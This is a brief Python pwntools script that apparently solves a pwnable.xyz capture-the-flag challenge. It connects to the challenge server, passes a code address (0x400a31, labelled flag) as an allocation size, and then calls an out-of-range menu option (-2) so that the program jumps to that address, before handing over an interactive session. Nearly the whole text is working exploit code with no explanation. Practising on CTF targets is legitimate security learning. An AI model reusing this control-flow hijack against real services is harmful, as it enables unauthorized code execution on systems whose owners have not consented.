from pwn import *

###Util
def create(size):
    r.sendlineafter('> ','1')
    r.sendlineafter('Size: ',str(size))

def call_size():
    r.sendlineafter('> ','-2')

###Addr
flag = 0x400a31

###Exploit
r = remote('svc.pwnable.xyz',30007)
create(flag)
call_size()

r.interactive()
